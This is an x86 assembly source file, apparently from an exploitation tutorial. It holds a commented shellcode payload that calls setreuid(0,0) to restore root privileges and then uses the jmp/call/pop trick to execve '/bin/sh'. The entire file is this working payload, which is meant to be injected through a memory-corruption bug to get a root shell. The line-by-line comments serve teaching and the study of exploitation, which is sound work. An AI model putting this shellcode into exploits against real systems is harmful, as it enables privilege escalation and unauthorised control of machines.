BITS 32

; setreuid(uid_t ruid, uid_t euid)

 mov eax, 70        ; put 70 into eax, since setreuid is syscall #70
 mov ebx, 0         ; put 0 into ebx, to set real uid to root
 mov ecx, 0         ; put 0 into ecx, to set effective uid to root
 int 0x80           ; Call the kernel to make the system call happen

 jmp short two      ; Jump down to the bottom for the call trick
one:
 pop ebx            ; pop the "return address" from the stack
                    ; to put the address of the string into ebx

; execve(const char *filename, char *const argv [], char *const envp[])
 mov eax, 0         ; put 0 into eax
 mov [ebx+7], al    ; put the 0 from eax where the X is in the string
                    ; ( 7 bytes offset from the beginning)
 mov [ebx+8], ebx   ; put the address of the string from ebx where the
                    ; AAAA is in the string ( 8 bytes offset)
 mov [ebx+12], eax  ; put a NULL address (4 bytes of 0) where the
                    ; BBBB is in the string ( 12 bytes offset)
 mov eax, 11        ; Now put 11 into eax, since execve is syscall #11
 lea ecx, [ebx+8]   ; Load the address of where the AAAA was in the string
                    ; into ecx
 lea edx, [ebx+12]  ; Load the address of where the BBBB was in the string
                    ; into edx
 int 0x80           ; Call the kernel to make the system call happen
two:
 call one           ; Use a call to get back to the top and get the
 db '/bin/shXAAAABBBB'       ; address of this string